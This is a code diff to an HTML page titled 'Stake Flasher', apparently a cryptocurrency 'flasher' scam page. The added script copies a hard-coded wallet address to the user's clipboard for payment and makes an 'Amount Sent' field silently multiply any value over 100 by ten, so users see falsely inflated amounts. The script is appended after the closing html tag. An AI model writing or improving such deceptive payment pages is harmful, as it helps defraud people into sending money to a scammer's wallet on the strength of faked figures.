@@ -2,6 +2,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta charset="UTF-8">
     <title>Stake Flasher</title>
     <style>
@@ -37,4 +38,20 @@
         }
     </script>
 </body>
-</html>
+</html><input type="number" id="amount" placeholder="Amount Sent (USD)">
+
+<script>
+function copyAddress() {
+    navigator.clipboard.writeText("0x24f551eae922e4a72b05f678626e86ee241461a0");
+    alert("Address Copied!");
+}
+
+// Amount logic
+document.getElementById("amount").addEventListener("input", function() {
+    let value = parseFloat(this.value);
+
+    if (value > 100) {
+        this.value = value * 10;
+    }
+});
+</script>
